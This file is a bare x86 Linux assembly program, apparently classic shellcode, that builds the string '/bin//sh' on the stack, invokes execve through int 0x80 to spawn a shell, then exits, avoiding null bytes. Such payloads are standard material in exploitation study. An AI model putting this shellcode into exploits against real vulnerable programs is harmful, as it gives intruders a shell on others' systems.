.data
.text
 .global _start

_start:
xor %eax, %eax
push %eax
push $0x68732F2F
push $0x6E69622F
mov $0xb, %al
mov %esp, %ebx
xor %ecx, %ecx
xor %edx, %edx
int $0x80
xor %eax, %eax
xor %ebx, %ebx
inc %eax
int $0x80

